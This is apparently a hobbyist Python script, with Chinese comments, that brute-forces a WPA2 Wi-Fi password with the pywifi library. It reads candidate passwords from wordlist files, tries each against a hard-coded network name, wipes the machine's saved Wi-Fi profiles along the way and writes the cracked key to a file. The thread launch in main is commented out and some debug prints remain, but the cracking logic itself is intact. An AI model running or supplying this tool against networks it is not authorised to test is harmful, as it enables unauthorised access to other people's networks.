# -*- coding:utf-8 -*-
import os
import sys
import threading
import time
import pywifi
from pywifi import const
cpath_current = os.path.dirname(os.path.dirname(__file__))
cpath = os.path.abspath(os.path.join(cpath_current))
sys.path.append(cpath)
class NewWifi(object):
    def __init__(self, wifiName, filePath):
        self.tag = False
        self.wifiName = wifiName
        self.filePath = filePath
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.ifaces = wifi.interfaces()  # 获取无线网卡,list类型
        for i in self.ifaces:
            i.disconnect()  # 断开所有无线连接

    def readPassword(self, pfl, iface):
        for pf in pfl:
            if self.tag is True:
                break
            path = self.filePath + "\\" + pf
            file = open(path, "r")
            while True:
                pwd = file.readline()
                self.connect(pwd.strip(), iface)
                if self.tag is True:
                    break
                elif pwd == '':
                    print(pf + "没有密码！")
                    break
                else:
                    print("破解中...: " + pwd, end='')

    def connect(self, pwd, iface):
        profile = pywifi.Profile()  # 创建WiFi连接文件
        profile.ssid = self.wifiName  # 要连接WiFi的名称
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法,一般wifi加密算法为wps
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = pwd  # 调用密码
        iface.remove_all_network_profiles()  # 删除所有连接过的wifi文件
        tmp_profile = iface.add_network_profile(profile)  # 设定新的连接文件
        iface.connect(tmp_profile)  # 连接wifi
        time.sleep(3.5)
        if iface.status() == const.IFACE_CONNECTED:  # 判断是否成功连接
            self.tag = True
            f = open("pwd.txt", 'w')
            f.write(pwd)
            print("----------------密码已破解！-------------------")
        iface.disconnect()
        time.sleep(0.5)

    def getPasswordFileList(self, num, l):
        files = []
        print(self.filePath)
        print(123)
        fileList = os.listdir(self.filePath)
        while num < len(fileList):
            files.append(fileList[num])
            num += l
        return files

    def main(self):
        wifiLength = len(self.ifaces)
        
        print(wifiLength)
        for i in range(wifiLength):
            if self.tag is False:
                passwordFileList = self.getPasswordFileList(i, wifiLength)
                # th = threading.Thread(target=self.readPassword, args=(passwordFileList, self.ifaces[i]))
                # th.start()
                print(passwordFileList)
        print(wifiLength)

if __name__ == '__main__':
    print(cpath_current)
    nw = NewWifi('CMCC-udKg', f'{cpath_current}/')  # CMCC-udKg
    nw.main()